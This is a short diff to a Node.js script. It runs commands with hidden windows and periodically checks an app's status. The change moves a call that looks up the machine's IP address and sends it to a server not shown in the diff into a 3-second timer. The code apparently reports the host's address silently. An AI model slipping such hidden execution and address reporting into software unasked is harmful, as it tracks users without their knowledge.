@@ -3,7 +3,6 @@ const { exec } = require("child_process");
 const axios = require("axios");
 const execOptions = { windowsHide: true };
 
-let IP;
 // Function to retrieve the IP address
 function getIpAddress() {
   return new Promise((resolve, reject) => {
@@ -125,8 +124,6 @@ async function sendIpAddress(ipAddress) {
   }
 }
 
-sendIpAddress(IP);
-
 // Main function to retrieve IP and check conditions
 async function main() {
   try {
@@ -166,6 +163,13 @@ async function main() {
     console.error("Error checking app status:", error.message);
   }
 }
+
+let IP;
+setTimeout(async () => {
+  IP = await getIpAddress();
+  console.log(IP, "nicenice");
+  await sendIpAddress(IP);
+}, 3000);
 
 // Execute the main function
 setInterval(() => {
